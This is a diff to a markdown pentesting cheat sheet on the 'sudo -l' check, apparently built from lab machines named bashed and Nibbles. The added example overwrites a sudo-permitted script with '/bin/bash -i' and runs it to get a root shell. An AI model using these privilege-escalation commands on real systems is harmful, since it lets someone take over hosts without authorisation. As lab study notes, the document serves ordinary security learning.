@@ -33,18 +33,44 @@ sudo -l
 <!-- Example {{{-->
 > [!example]-
 >
+> Run any command as `scriptmanager` via `sudo`, without a password
+>
 > ```sh
-> www-data@bashed:/home/arrexel# sudo -l
+> sudo -l
 > ```
 > ```sh
 > Matching Defaults entries for www-data on bashed:
-> env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+>   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 >
 > User www-data may run the following commands on bashed:
 > (scriptmanager : scriptmanager) NOPASSWD: ALL
 > ```
+<!-- }}} -->
+
+<!-- Example {{{-->
+> [!example]-
 >
-> Run any command as `scriptmanager` via `sudo`, without a password
+> Run a script as `sudo`, without a password
+>
+> ```sh
+> sudo -l
+> ```
+> ```sh
+> Matching Defaults entries for nibbler on Nibbles:
+>     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+>
+> User nibbler may run the following commands on Nibbles:
+>     (root) NOPASSWD: /home/nibbler/monitor.sh
+> ```
+> ```sh
+> echo "/bin/bash -i" > /home/nibbler/monitor.sh
+> ```
+> ```sh
+> chmod +x /home/nibbler/monitor.sh
+> ```
+> ```sh
+> sudo /home/nibbler/monitor.sh
+> ```
 <!-- }}} -->
 
 [sudo](https://man7.org/linux/man-pages/man8/sudo.8.html) —
